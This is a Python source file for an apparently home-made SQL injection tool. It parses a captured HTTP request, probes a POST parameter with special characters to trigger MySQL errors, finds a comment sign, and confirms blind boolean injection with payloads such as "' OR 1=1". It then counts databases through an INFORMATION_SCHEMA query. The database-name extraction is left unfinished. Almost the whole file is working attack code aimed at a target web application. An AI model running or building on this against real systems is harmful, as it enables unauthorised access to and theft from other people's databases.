import requests
import sys
import copy

from DB import DB
from Table import Table
from HTTPRequest import HTTPRequest
from Enums import HTTP_Types

# communication with user
SQLI_DETECTED_MSG = "SQLi may have been detected!\n"
SQLI_NOT_DETECTED_MSG = "SQLi not detected. \n"
SQLI_NO_COMMENT_SIGN_DETECTED = "Cannot find commenting option. \n"
BOOLEAN_BSQLI_ENABLED = "Boolean blind sqli is possible! \n"
BOOLEAN_BSQLI_DISABLED = "Boolean blind sqli is not possible. \n"

# chars and seperators
HEADER_SEP = ": "
AMPERSAND = "&"
EQUAL_SIGN = "="
APOSTROPHE = '\''

# strings and flags for the program
NOT_DETECTED = "no"
BOOLEAN_FALSE_RESPONSE_INDEX = 0
BOOLEAN_TRUE_RESPONSE_INDEX = 1

# constants
MAX_NUM_OF_DBS_TO_CHECK = 20

# sql queries
# Blind Boolean-based sql injection:
# check if option exists:
BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0%s"
BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1%s"
# check amount of dbs:
BLIND_BOOLEAN_COUNT_DBS = "\' or (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME) = %s%s"

# flags for operating the program
READ_REQUEST_FILE_FLAG = '-r'
PARAMETER_FLAG = "-p"

# lists of Strings
SQL_ERRORS = ["you have an error in your sql syntax"]
SQL_COMMENTS = [" -- ", "#"]
SQLI_CHARS = ["\'", "\0", "\\", "-", "%", "#"]

def parse_request_file(request_filepath):
    """
    parses a txt file of a request (copied from fiddler, for example) into a HTTPRequest Object
    :param request_filepath: the path to the txt file
    :return: a HTTPRequest object containing all the data
    """
    with open(request_filepath) as fp:
        lines = fp.read().splitlines()
    request = HTTPRequest()
    headers = True
    for i in range(0, len(lines)):
        if i == 0:
            request.set_method(HTTP_Types[lines[i].split(" ")[0]])
            request.set_url(lines[i].split(" ")[1])
        else:
            if lines[i] == '':
                headers = False
            elif headers:
                header_name = lines[i].split(HEADER_SEP)[0]
                request.set_header(header_name, lines[i].split(header_name + HEADER_SEP)[-1])
            else:  # assuming only parameters and no data
                for parameter in lines[i].split(AMPERSAND):
                    name = parameter.split(EQUAL_SIGN)[0]
                    value = parameter.split(name + EQUAL_SIGN)[1]
                    request.set_parameter(name, value)
    return request


def get_request_copy(request):
    """
    creates a deep copy of a HTTPRequest object and all of its attributes
    :param request: the object we want to copy
    :return: a copy of this object
    """
    new_request = copy.deepcopy(request)
    new_parameters = copy.deepcopy(request.get_parameters())
    new_headers = copy.deepcopy(request.get_headers())
    new_request.set_parameters(new_parameters)
    new_request.set_headers(new_headers)
    return new_request


def send_post_request(request):
    """
    sends post request
    :param request: a HTTPRequest object containing all the data we want to send
    :return: the response
    """
    return requests.post(request.get_url(), data=request.get_parameters(), headers=request.get_headers())


def send_request(request):
    """
    redirects the request to the relevant function, according to the HTTP method we want to use
    :param request: a HTTPRequest object containing all the data we want to send
    :return: the response
    """
    if request.get_method() == HTTP_Types.POST:
        return send_post_request(request)


def find_sqli(request, parameter):
    """
    checks if the parameter given is sqli vulnerable by sending multiple requests to the server with different special
    characters and checking whether the response contains an error message
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter we want to check
    :return: the character causing the error, or NOT_DETECTED string if no error was caused
    """
    for char in SQLI_CHARS:
        request.set_parameter(parameter, char)
        response = send_request(request)
        for error_msg in SQL_ERRORS:
            if error_msg in response.text.lower():
                print(SQLI_DETECTED_MSG)
                return char
    print(SQLI_NOT_DETECTED_MSG)
    return NOT_DETECTED

def find_comment_sign(request, parameter):
    """
    checks which char is valid as a comment starter
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :return: the character marking a comment, or NOT_DETECTED string if no error was caused
    """
    for sign in SQL_COMMENTS:
        request.set_parameter(parameter, APOSTROPHE + sign)
        response = send_request(request)
        for error_msg in SQL_ERRORS:
            if error_msg not in response.text.lower():
                return sign
    print(SQLI_NO_COMMENT_SIGN_DETECTED)
    return NOT_DETECTED


def check_if_boolean_based_is_possible(request, parameter, comment):
    """
    check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
    comparing the results
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :param comment: the comment chars
    :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
    """
    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_FALSE % comment)
    boolean_false = send_request(request)
    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_TRUE % comment)
    boolean_true = send_request(request)
    if boolean_true.text != boolean_false.text:
        print(BOOLEAN_BSQLI_ENABLED)
        return boolean_false, boolean_true
    print(BOOLEAN_BSQLI_DISABLED)
    return NOT_DETECTED

def find_number_of_dbs(request, parameter, comment, true_and_false_requests):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_requests:
    :return:
    """
    for number_of_dbs in range(MAX_NUM_OF_DBS_TO_CHECK):
        request.set_parameter(parameter, BLIND_BOOLEAN_COUNT_DBS % (str(number_of_dbs), comment))
        response = send_request(request)
        if response.text != true_and_false_requests[BOOLEAN_FALSE_RESPONSE_INDEX].text:
            return number_of_dbs
    return NOT_DETECTED



def find_db_names(request, parameter, comment, true_and_false_requests):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_requests:
    :return:
    """
    num_of_dbs = find_number_of_dbs(request, parameter, comment, true_and_false_requests)

if __name__ == '__main__':
    origin_request = parse_request_file("C:\\Users\\Amit\\Downloads\\request.txt")
    parameter = "username"
    request = get_request_copy(origin_request)
    is_there_sqli = find_sqli(request, parameter)
    if is_there_sqli == NOT_DETECTED:
        exit(0)
    comment = find_comment_sign(request, parameter)
    if comment == NOT_DETECTED:
        exit(0)
    true_and_false_requests = check_if_boolean_based_is_possible(request, parameter, comment)
    if true_and_false_requests != NOT_DETECTED: # boolean is possible!
        find_db_names(request, parameter, comment, true_and_false_requests)


